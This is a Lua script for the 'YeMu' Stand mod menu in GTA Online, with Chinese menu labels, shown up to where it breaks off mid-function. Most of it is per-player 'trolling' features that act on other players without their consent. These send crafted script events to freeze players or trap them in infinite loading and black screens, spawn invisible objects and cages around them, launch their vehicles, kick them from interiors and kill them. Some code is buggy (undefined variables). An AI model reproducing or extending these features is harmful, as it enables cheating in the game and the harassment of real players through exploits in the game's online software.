---------------------------------------------------CV请鸣谢夜幕，除非你没有家人-----------------------------------------------------------
-----------------------------------------------------------制作脚本不易，CV请私信夜幕团队-----------------------------------------------------


require "lib.natives-1663599433"
require "lib.natives-1660775568"

require "lib.YeMulib.YMload"
require "lib.YeMulib.YMsr"
require "lib.YeMulib.YMnatives"
require "lib.YeMulib.YMspo"
require "lib.YeMulib.main"
require "lib.YeMulib.YMchaofeng"
require "lib.YeMulib.YeMulib"
require "lib.YeMulib.YMcu"
require "lib.YeMulib.YMEc"
JSkey = require 'lib.JSkeyLib'

resources_dir = filesystem.scripts_dir() .. '/YMS/'
if not filesystem.is_dir(resources_dir) then
    util.toast("资源目录丢失,请确保已正确安装YMS")
    util.stop_script()
end
resources_dir = filesystem.scripts_dir() .. '/lib/' .. '/YeMulib/'
if not filesystem.is_dir(resources_dir) then
    util.toast("资源目录丢失,请确保已正确安装YeMulib")
    util.stop_script()
end
ocoded_for = 1.68
verbose = false
online_v = tonumber(NETWORK._GET_ONLINE_VERSION())
if online_v > ocoded_for then
    util.toast("此GTA夜幕版本已过期 (" .. online_v .. ", 该脚本开发于 " .. ocoded_for .. ").请加入夜幕官方群更新！")
util.stop_script()
end
YMdet()
--[[ local aalib = require("aalib")
local PlaySound = aalib.play_sound
local SND_ASYNC<const> = 0x0001
local SND_FILENAME<const> = 0x00020000 ]]
----------------------------------
Version = 6.2
local TIANXIA = "欢迎使用夜幕-V" .. Version ..  ""
local JIAOBEN = "夜幕脚本"
local introduce = "欢迎使用夜幕LUA"
date = "2023.12.16"
wait = util.yield
joaat = util.joaat
alloc = memory.alloc
create_tick_handler = util.create_tick_handler
if SCRIPT_MANUAL_START and not SCRIPT_SILENT_START then
	gShowingIntro = true
	local state = 0
	local timer <const> = newTimer()
	AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "clown_die_wrapper", PLAYER.PLAYER_PED_ID(), "BARRY_02_SOUNDSET", true, 20)
	local scaleform = GRAPHICS.REQUEST_SCALEFORM_MOVIE("OPENING_CREDITS")
	util.create_tick_handler(function()
		if not GRAPHICS.HAS_SCALEFORM_MOVIE_LOADED(scaleform) then
			return
		end
		if state == 0 then
			SETUP_SINGLE_LINE(scaleform)
			ADD_TEXT_TO_SINGLE_LINE(scaleform, "YMLUA", "$font1.9", "HUD_COLOUR_YELLOW")
			ADD_TEXT_TO_SINGLE_LINE(scaleform, 'v' .. Version, "$font5", "HUD_COLOUR_GREEN")
			ADD_TEXT_TO_SINGLE_LINE(scaleform, PLAYER.GET_PLAYER_NAME(players.user()), "$font5", "HUD_COLOUR_RED")
			GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "SHOW_SINGLE_LINE")
			GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("presents")
			GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
			GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "SHOW_CREDIT_BLOCK")
			GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("presents")
			GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(0.5)
			GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
			state = 1
			timer.reset()
		end
		if timer.elapsed() >= 6000 and state == 1 then
			HIDE(scaleform)
			state = 2
			timer.reset()
		end

		GRAPHICS.DRAW_SCALEFORM_MOVIE_FULLSCREEN(scaleform, 255, 255, 255, 255, 0)
	end)
end
notification = b_notifications.new()
colors = {
    green = 184,
    red = 6,
    yellow = 190,
    black = 2,
    white = 1,
    gray = 3,
    pink = 190,
    purple = 49, 
    blue = 11
}
function notification(message, color)
        local picture = "CHAR_SOCIAL_CLUB"
        GRAPHICS.REQUEST_STREAMED_TEXTURE_DICT(picture, 0)
        while not GRAPHICS.HAS_STREAMED_TEXTURE_DICT_LOADED(picture) do
            util.yield()
        end
        util.BEGIN_TEXT_COMMAND_THEFEED_POST(message)
        title = "夜幕LUA"
        if color == colors.red or color == colors.red then
            subtitle = "~u~用户" .. players.get_name(players.user()) .. "&#8721;"
        elseif color == colors.black then
            subtitle = "~c~用户" .. players.get_name(players.user()) .. "&#8721;"
        else
            subtitle = "~u~用户" .. players.get_name(players.user()) .. "&#8721;"
        end
        HUD.END_TEXT_COMMAND_THEFEED_POST_MESSAGETEXT(picture, picture, true, 5, title, subtitle)
        HUD.END_TEXT_COMMAND_THEFEED_POST_TICKER(true, false)
        util.log(message)
end
function player_toggle_loop(root, PlayerID, menu_name, command_names, help_text, callback)
    return menu.toggle_loop(root, menu_name, command_names, help_text, function()
        if not players.exists(PlayerID) then util.stop_thread() end
        callback()
    end)
end
local spawned_objects = {}
local function is_player_in_interior(PlayerID)
    return (memory.read_int(memory.script_global(2689235 + 1 + (PlayerID * 453) + 243)) ~= 0)
end
function log(content)
    if verbose then
        util.log("[夜幕LUA] " .. content)
    end
end
if SCRIPT_MANUAL_START then
    YMlabel()
end
local function request_model(hash)
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do
        util.yield()
    end
end
local launch_vehicle = {"向上", "向前", "向后", "向下", "翻滚"}
local invites = {"游艇", "办公室", "会所", "办公室车库", "载具改装铺", "公寓"}
menu.action(menu.my_root(), '一键转到菜单', {"tiaozhuan"}, '跳转速度更加方便', function()
   menu.trigger_commands("YMscript")
end)
menu.action(menu.my_root(),"重启夜幕脚本",{},"",function ()
    util.restart_script()
    scaleform_thread = util.create_thread(function (thr)
	scaleForm = GRAPHICS.REQUEST_SCALEFORM_MOVIE("MP_BIG_MESSAGE_FREEMODE")
    local scaleform = GRAPHICS.REQUEST_SCALEFORM_MOVIE("mp_big_message_freemode")
	GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleForm, "SHOW_SHARD_WASTED_MP_MESSAGE")
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("&#8721; ~bold~夜幕 LUA &#8721;")
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("&#8721;欢迎回来！尊贵的夜幕LUA用户&#8721;\n\n""~bold~~b~版本号:" .. Version ..  "~bold~~b~更新于" .. date ..  "")
	GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
    AUDIO.PLAY_SOUND_FRONTEND(55, "FocusIn", "HintCamSounds", true)
	starttime = os.time()
	while true do
	if os.time() - starttime >= 5 then
	    AUDIO.PLAY_SOUND_FRONTEND(55, "FocusOut", "HintCamSounds", true)
	    util.stop_thread()
    end
	if GRAPHICS.HAS_SCALEFORM_MOVIE_LOADED(scaleForm) then
        GRAPHICS.DRAW_SCALEFORM_MOVIE_FULLSCREEN(scaleForm, 155, 155, 255, 255,0)
    end
	   util.yield(1)
        end
    end)
end)
menu.divider(menu.my_root(), "夜幕脚本信息")
    menu.action(menu.my_root(), "夜幕第一制作:Ping", {}, "大帅逼一枚~~~", function()
end)
    menu.action(menu.my_root(), "夜幕第二制作:呆呆", {}, "大美女一枚~~~", function()
end)
menu.divider(menu.my_root(), "版本号:" .. Version ..  "更新于" .. date ..  "")
local YM_root = menu.attach_before(menu.ref_by_path('Stand>Settings'),menu.list(menu.shadow_root(), "夜幕LUA-V" .. Version ..  "" , {"YMscript"}, "" .. introduce .. "" , 
function()end))
menu.trigger_commands("YMscript")
menu.action(YM_root,"关闭夜幕脚本",{},"",function ()
    util.stop_script()
end)
local festive_div = menu.divider(YM_root, "运行夜幕LUA", {}, "")
    local loading_frames = {'!~', '~~', '~~~', '~~~~', '~~~~~', '~~~~', '~~~', '~~','~!'}
    util.create_tick_handler(function()
        for _, frame in pairs(loading_frames) do
            menu.set_menu_name(festive_div, frame .. ' ' .. TIANXIA .. ' ' .. frame)
            util.yield(100)
        end
end)
self = menu.list(YM_root, "自我选项", {}, "")
jiashi = menu.list(YM_root, "载具选项", {}, "")
zidongrenwu = menu.list(YM_root, "任务选项（含恢复选项）", {}, "")
funfeatures = menu.list(YM_root, "娱乐选项", {}, "")
weapon = menu.list(YM_root, "武器选项", {}, "")
fanyiyuyan = menu.list(YM_root, "聊天选项", {}, "")
quanju = menu.list(YM_root, "全局选项", {}, "")
sc = menu.list(YM_root, "模组选项", {""}, "")
protections = menu.list(YM_root, "保护选项", {}, "")
online = menu.list(YM_root, "线上选项", {}, "")
function player(PlayerID)   
    if players.get_rockstar_id(PlayerID) == 183122956 then
        util.show_corner_help("~h~~p~夜幕LUA提示你\n~h~~w~夜幕主策划在此战局，请注意您的游戏行为！~b~‹\n")
        store_dir = filesystem.store_dir() .. '\\YMss\\'
        sound_selection_dir = store_dir .. '\\sound20.txt'
        if not filesystem.is_dir(store_dir) then
            util.toast("夜幕音频没有正确安装！.")
            util.stop_script()
        end
        fp = io.open(sound_selection_dir, 'r')
        local file_selection = fp:read('*a')
        fp:close()
        local sound_location = store_dir .. '\\' .. file_selection
        if not filesystem.exists(sound_location) then
            util.toast("[夜幕提示] " .. file_selection .. " 未找到音源.")
        else
            --PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
        end
    util.keep_running()
end

menu.divider(menu.player_root(PlayerID), "---夜幕LUA---", {}, "")
    bozo = menu.list(menu.player_root(PlayerID), "夜幕脚本", {"YMScript"}, "")
    friendly = menu.list(bozo, "友好选项", {}, "")
    player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    armsfriendly = menu.list(friendly, "武器友好", {}, "")
    menu.action(armsfriendly, "给予武器", {""}, "", function()
           menu.trigger_commands("arm " .. players.get_name(PlayerID))
    end)
    menu.action(armsfriendly, "给予所有武器子弹", {""}, "", function()
           menu.trigger_commands("ammo " .. players.get_name(PlayerID))
    end)
    menu.action(armsfriendly, "给予降落伞", {""}, "", function()
           menu.trigger_commands("paragive " .. players.get_name(PlayerID))
    end)
    menu.toggle_loop(armsfriendly, "移除所有武器", {""}, "", function()
           menu.trigger_commands("disarm " .. players.get_name(PlayerID))
    end)
    menu.toggle_loop(friendly, "永不通缉", {""}, "", function()
           menu.trigger_commands("bail " .. players.get_name(PlayerID))
    end)
    menu.toggle_loop(friendly, "给予载具无敌", {}, "大多数菜单不会将其检测为载具无敌", function()
        ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(player), true, true, true, true, true, 0, 0, true)
        end, function() ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(player), false, false, false, false, false, 0, 0, false)
    end)
    menu.action(friendly, "修复载具", {}, "帮他修车.", function() 
        repair_player_vehicle(PlayerID) 
    end)
    menu.action(friendly,"升级车辆", {}, "", function()
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local vehicle = PED.GET_VEHICLE_PED_IS_USING(player_ped)
    request_control_of_entity(vehicle)
    upgrade_vehicle(vehicle)
    end)
    menu.action(friendly, "修复加载屏幕", {}, "尝试用传送方法修复无限加载屏幕", function()
        menu.trigger_commands("givesh" .. players.get_name(PlayerID))
        menu.trigger_commands("aptme" .. players.get_name(PlayerID))
    end)
    menu.action(friendly, "给予25等级", {}, "给予该玩家 17 万RP经验,可从 1 级提升至 25 级.\n一名玩家只能用一次嗷", function()
        menu.trigger_commands("givecollectibles" .. players.get_name(PlayerID))
    end)
    menu.action(friendly, "给予脚本主机", {}, "", function()
        while players.get_script_host() ~= PlayerID do 
            menu.trigger_commands("givesh" .. players.get_name(PlayerID))
            util.yield(10)
        end
        util.yield(500)
    end)
---------------------------------------------------CV请鸣谢夜幕，除非你没有家人------------------------------------------------------
    menu.toggle_loop(friendly, "拦截附加物", {}, "", function()
    local pos = ENTITY.GET_ENTITY_COORDS(PlayerID) --获取目标位置
    GRAPHICS.REMOVE_PARTICLE_FX_IN_RANGE(pos.x, pos.y, pos.z, 15) --清除目标实体位置周围所有粒子特效
    GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(PlayerID) --清除目标实体所有粒子特效
    end)
    trolling = menu.list(bozo, "恶搞选项", {}, "")
    trolling2 = menu.list(bozo, "恶搞选项2", {}, "恶搞种类太多，后续恶搞会在此选项里")
    player_toggle_loop(trolling, PlayerID, "将玩家推向前方", {}, "", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local pos = ENTITY.GET_ENTITY_COORDS(player, false)
        local glitch_hash = util.joaat("prop_shuttering03")
        request_model(glitch_hash)
        local dumb_object_front = entities.create_object(glitch_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(PlayerID), 0, 1, 0))
        local dumb_object_back = entities.create_object(glitch_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(PlayerID), 0, 0, 0))
        ENTITY.SET_ENTITY_VISIBLE(dumb_object_front, false)
        ENTITY.SET_ENTITY_VISIBLE(dumb_object_back, false)
        util.yield()
        entities.delete_by_handle(dumb_object_front)
        entities.delete_by_handle(dumb_object_back)
        util.yield()    
    end)
    local glitchVeh = false
    local glitchVehCmd
    glitchVehCmd = menu.toggle(trolling, "鬼畜载具", {}, "", function(toggle) -- credits to soul reaper for base concept
        glitchVeh = toggle
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local pos = ENTITY.GET_ENTITY_COORDS(player, false)
        local player_veh = PED.GET_VEHICLE_PED_IS_USING(player)
        local veh_model = players.get_vehicle_model(PlayerID)
        local ped_hash = util.joaat("a_m_m_acult_01")
        local object_hash = util.joaat("prop_ld_ferris_wheel")
        request_model(ped_hash)
        request_model(object_hash)
        
        while glitchVeh do
            if not PED.IS_PED_IN_VEHICLE(player, player_veh, false) then 
                util.toast("玩家不在车内. :/")
                menu.set_value(glitchVehCmd, false);
            break end
            if not VEHICLE.ARE_ANY_VEHICLE_SEATS_FREE(player_veh) then
                util.toast("没有空出来的座位. :/")
                menu.set_value(glitchVehCmd, false);
            break end
            local seat_count = VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(veh_model)
            local glitch_obj = entities.create_object(object_hash, pos)
            local glitched_ped = entities.create_ped(26, ped_hash, pos, 0)
            local things = {glitched_ped, glitch_obj}
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(glitch_obj)
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(glitch_ped)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(glitch_obj, glitched_ped, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
            for i, spawned_objects in ipairs(things) do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(spawned_objects)
                ENTITY.SET_ENTITY_VISIBLE(spawned_objects, false)
                ENTITY.SET_ENTITY_INVINCIBLE(spawned_objects, true)
            end
            for i = 0, seat_count -1 do
                if VEHICLE.ARE_ANY_VEHICLE_SEATS_FREE(player_veh) then
                    local emptyseat = i
                    for l = 1, 25 do
                        PED.SET_PED_INTO_VEHICLE(glitched_ped, player_veh, emptyseat)
                        ENTITY.SET_ENTITY_COLLISION(glitch_obj, true, true)
                        util.yield()
                    end
                end
            end
            util.yield()
            if not menu.get_value(glitchVehCmd) then
                entities.delete_by_handle(glitched_ped)
                entities.delete_by_handle(glitch_obj)
            end
            if glitched_ped ~= nil then -- 在这里添加了第二阶段,因为它有时无法删除.
                entities.delete_by_handle(glitched_ped) 
            end
            if glitch_obj ~= nil then 
                entities.delete_by_handle(glitch_obj)
            end
        end
    end)
    local glitchForcefield = false
    local glitchforcefield_toggle
    glitchforcefield_toggle = menu.toggle(trolling, "范围删除", {}, "启用后会将此玩家附近的模型删除", function(toggled)
        glitchForcefield = toggled
        local glitch_hash = util.joaat("p_spinning_anus_s")
        request_model(glitch_hash)
        while glitchForcefield do
            local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
            local playerpos = ENTITY.GET_ENTITY_COORDS(player, false)
            
            if PED.IS_PED_IN_ANY_VEHICLE(player, true) then
                util.toast("玩家在载具中. :/")
                menu.set_value(glitchforcefield_toggle, false);
            break end
            
            local stuPlayerID_object = entities.create_object(glitch_hash, playerpos)
            ENTITY.SET_ENTITY_VISIBLE(stuPlayerID_object, false)
            ENTITY.SET_ENTITY_INVINCIBLE(stuPlayerID_object, true)
            ENTITY.SET_ENTITY_COLLISION(stuPlayerID_object, true, true)
            util.yield()
            entities.delete_by_handle(stuPlayerID_object)
            util.yield()    
        end
    end)
    player_toggle_loop(trolling, PlayerID, "弹飞玩家", {"Bouncetheplayer"}, "也适用于载具", function() 
        local poopy_butt = util.joaat("adder")
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local pos = ENTITY.GET_ENTITY_COORDS(player)
        pos.z -= 10
        request_model(poopy_butt)
        local vehicle = entities.create_vehicle(poopy_butt, pos, 0)
        ENTITY.SET_ENTITY_VISIBLE(vehicle, false)
        util.yield(250)
        if vehicle ~= 0 then
            ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 1, 0.0, 0.0, 100, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        end
        util.yield(250)
        entities.delete_by_handle(vehicle)
    end)
    local freeze = menu.list(trolling, "冻结选项", {}, "")
    player_toggle_loop(freeze, PlayerID, "暴力冻结", {}, "使玩家无法控制移动和视角", function()
        util.trigger_script_event(1 << PlayerID, {330622597, PlayerID, 0, 0, 0, 0, 0})
        util.yield(500)
    end)
    player_toggle_loop(freeze, PlayerID, "冻结", {}, "使玩家无法控制移动和视角", function()
        util.trigger_script_event(1 << PlayerID, {-1796714618, PlayerID, 0, 0, 0, 0, 0})
        util.yield(500)
    end)
    player_toggle_loop(freeze, PlayerID, "模型冻结", {}, "使玩家的模型无法移动", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(player)
    end)
    local inf_loading = menu.list(trolling, "无限加载屏幕", {}, "")
    menu.action(inf_loading, "传送邀请", {}, "", function()
        util.trigger_script_event(1 << PlayerID, {891653640, PlayerID, 0, 32, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(PlayerID), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    end)
    menu.action(inf_loading, "公寓邀请", {}, "", function()
        util.trigger_script_event(1 << PlayerID, {-1796714618, PlayerID, PlayerID, -1, 1, 115, 0, 0, 0})
    end)
        
    menu.textslider(inf_loading, "资产邀请", {}, "单击以选择样式", invites, function(index, name)
        pluto_switch name do
            case "游艇":
            util.trigger_script_event(1 << PlayerID, {36077543, PlayerID, 1})
            util.toast("游艇邀请已发送")
            break
            case "办公室":
            util.trigger_script_event(1 << PlayerID, {36077543, PlayerID, 2})
            util.toast("办公室邀请已发送")
            break
            case "会所":
            util.trigger_script_event(1 << PlayerID, {36077543, PlayerID, 3})
            util.toast("会所邀请已发送")
            break
            case "办公室车库":
            util.trigger_script_event(1 << PlayerID, {36077543, PlayerID, 4})
            util.toast("办公室车库邀请已发送")
            break
            case "载具改装铺":
            util.trigger_script_event(1 << PlayerID, {36077543, PlayerID, 5})
            util.toast("载具改装铺邀请已发送")
            break
            case "公寓":
            util.trigger_script_event(1 << PlayerID, {36077543, PlayerID, 6})
            util.toast("公寓邀请已发送")
            break
        end
    end)
    player_toggle_loop(trolling, PlayerID, "使该玩家黑屏", {}, "将此玩家传送到会所来达到黑屏", function()
        util.trigger_script_event(1 << PlayerID, {891653640, PlayerID, math.random(1, 32), 32, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(PlayerID), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        util.yield(1000)
    end)
menu.action(trolling, "驱逐玩家", {"evict"}, "强制将玩家踢出室内\n部分室内则无法踢出.", function()
        if players.is_in_interior(PlayerID) then
            menu.trigger_commands("interiorkick" .. players.get_name(PlayerID))
        else
            notification("玩家不在室内", colors.black)
        end
end)
    cage = menu.list(trolling, "笼子选项", {}, "")
    menu.action(cage, "删除所有生成的笼子", {"clearcages"}, "删除非自动套笼", function()
        local entitycount = 0
        for i, object in ipairs(spawned_objects) do
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(object, false, false)
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(object)
            entities.delete_by_handle(object)
            spawned_objects[i] = nil
            entitycount += 1
        end
        util.toast("删除了 " .. entitycount .. " 个已生成的笼子")
    end)
menu.action(cage, "笼子", {""}, "", function ()
    ptlz(PlayerID)
end)
menu.action(cage, "七度空间", {""}, "", function ()
    qdkj(PlayerID)
end)
menu.action(cage, "钱笼子", {""}, "", function ()
    zdlz(PlayerID)
end)
menu.action(cage, "垃圾箱", {""}, "", function ()
    yylz(PlayerID)
end)
menu.action(cage, "小车车", {""}, "", function ()
    cclz(PlayerID)
end)
menu.action(cage, "圣诞快乐", {""}, "", function ()
    sdkl1(PlayerID)
end)
menu.action(cage, "圣诞快乐pro", {""}, "", function ()
    sdkl2(PlayerID)
end)
menu.action(cage, "圣诞快乐promax", {""}, "", function ()
    sdkl3(PlayerID)
end)
menu.action(cage, "竞技管", {""}, "", function ()
    jjglz(PlayerID)
end)
menu.action(cage, "英国女王笼子", {""}, "", function(cl)
    gueencage(PlayerID)
end)
menu.action(cage, "载具笼子", {"cage4321"}, "", function()
    vehcagelol(PlayerID)
end)
menu.action(cage, "燃气笼", {"gascage4321"}, "", function()
    gascage(PlayerID)
end)
    menu.action(cage, "电击笼子", {"electriccage"}, "在此玩家周围生成电击器来困住玩家", function(cl)
        local number_of_cages = 4
        local elec_box = util.joaat("prop_elecbox_12")
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local pos = ENTITY.GET_ENTITY_COORDS(player)
        pos.z -= 0.5
        request_model(elec_box)
        local temp_v3 = v3.new(0, 0, 0)
        for i = 1, number_of_cages do
            local angle = (i / number_of_cages) * 360
            temp_v3.z = angle
            local obj_pos = temp_v3:toDir()
            obj_pos:mul(2.1)
            obj_pos:add(pos)
            for offs_z = 1, 5 do
                local electric_cage = entities.create_object(elec_box, obj_pos)
                spawned_objects[#spawned_objects + 1] = electric_cage
                ENTITY.SET_ENTITY_ROTATION(electric_cage, 90, 0, angle, 2, 0)
                obj_pos.z += 0.75
                ENTITY.FREEZE_ENTITY_POSITION(electric_cage, true)
            end
        end
    end)
    
    menu.action(cage, "斜坡笼子", {}, "在此玩家上方生成一个斜坡来困住玩家", function()
        local ramp_hash = util.joaat("prop_jetski_ramp_01")
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local pos = ENTITY.GET_ENTITY_COORDS(player)
        local rot = ENTITY.GET_ENTITY_ROTATION(ped, 2)
        request_model(ramp_hash)
        local ramp_cage = OBJECT.CREATE_OBJECT(ramp_hash, pos.x, pos.y, pos.z, true, false, true)
        spawned_objects[#spawned_objects + 1] = ramp_cage
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ramp_cage)
    end)
    menu.action(cage, "集装箱笼子", {"cage"}, "生成一个集装箱来困住玩家", function()
        local container_hash = util.joaat("prop_container_05a")
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(player, 0, 0, -1)
        local rot = ENTITY.GET_ENTITY_ROTATION(player, 2)
        request_model(container_hash)
        local container = OBJECT.CREATE_OBJECT(container_hash, pos.x, pos.y, pos.z, true, false, true)
        spawned_objects[#spawned_objects + 1] = container
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(container)
        ENTITY.FREEZE_ENTITY_POSITION(container, true)
    end)
    local cage_loop = false
	menu.toggle(cage, "全自动系统套笼", {""}, "全新的自动套笼系统", function(on)
		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		local a = ENTITY.GET_ENTITY_COORDS(player_ped) --first position
		cage_loop = on
		if cage_loop then
			if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
				menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(PlayerID).." on")
				util.yield(300)
				if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
					notification("踢出载具失败", colors.red)
					menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(PlayerID).." off")
					return
				end
				menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(PlayerID).." off")
				a =  ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID))
			end
			cage_player(a)
		end
		while cage_loop do
			local b = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)) 
			local ba = {x = b.x - a.x, y = b.y - a.y, z = b.z - a.z} 
			if math.sqrt(ba.x * ba.x + ba.y * ba.y + ba.z * ba.z) >= 4 then 
				a = b
				if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
					goto continue
				end
				cage_player(a)
				notification(PLAYER.GET_PLAYER_NAME(PlayerID).."休想逃，嘿嘿，再次套住", colors.black)
				::continue::
			end
			util.yield(1000)
		end
	end)
	menu.action(cage, "删除全自动笼子", {""}, "此选项只能删除全自动所刷出的笼子", function() -- ez fix but lazy
		for key, value in pairs(cages) do
			entities.delete_by_handle(value)
		end
	end)

    menu.action(trolling, "杀死室内玩家", {}, "若此玩家在公寓则无法使用(仅对绿玩有效)", function()
        menu.trigger_commands("kill".. PLAYER.GET_PLAYER_NAME(PlayerID))
    end)
    player_toggle_loop(trolling, PlayerID, "循环电击枪", {}, "在此玩家周围生成电击枪发射音效", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local pos = ENTITY.GET_ENTITY_COORDS(player)
        for i = 1, 50 do
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 0, true, util.joaat("weapon_stungun"), players.user_ped(), false, true, 1.0)
        end
        util.yield(100)
    end)
    player_toggle_loop(trolling, PlayerID, "循环原子能枪", {}, "在此玩家周围生成原子能枪发射音效", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local pos = ENTITY.GET_ENTITY_COORDS(player)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z - 0.3, pos.x, pos.y, pos.z, 0, true, util.joaat("weapon_raypistol"), players.user_ped(), true, false, 1.0)
        util.yield(250)
    end)
    menu.action(trolling, "送进监狱", {}, "将此玩家传送到博林布鲁克监狱", function()
        local my_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID))
        local my_ped = PLAYER.GET_PLAYER_PED(players.user())
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, 1628.5234, 2570.5613, 45.56485, true, false, false, false)
        menu.trigger_commands("givesh " .. players.get_name(PlayerID))
        menu.trigger_commands("summon " .. players.get_name(PlayerID))
        menu.trigger_commands("invisibility on")
        menu.trigger_commands("otr")
        util.yield(5000)
        menu.trigger_commands("invisibility off")
        menu.trigger_commands("otr")
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, my_pos.x, my_pos.y, my_pos.z)
    end)
    menu.textslider(trolling, "发射玩家载具", {}, "", launch_vehicle, function(index, value)
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local veh = PED.GET_VEHICLE_PED_IS_IN(player, false)
        if not PED.IS_PED_IN_ANY_VEHICLE(player, true) then
            util.toast("玩家不在载具里. :/")
            return
        end
        while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            util.yield()
        end
        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) and count >= 100 then
            util.toast("无法控制此玩家载具. :/")
            return
        end
        pluto_switch value do
            case "向上":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0.0, 100000, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            case "向前":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 100000, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            case "向后":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, -100000, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            case "向下":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0.0, -100000, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            case "翻滚":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0.0, 100000, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 100000, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            end
        end)
    menu.action(trolling, "强制室内黑屏", {}, "玩家必须在公寓里,可以通过重新加入战局来撤销", function(s)
        if is_player_in_interior(PlayerID) then
            util.trigger_script_event(1 << PlayerID, {-1338917610, PlayerID, PlayerID, PlayerID, PlayerID, math.random(-2147483647, 2147483647), PlayerID})
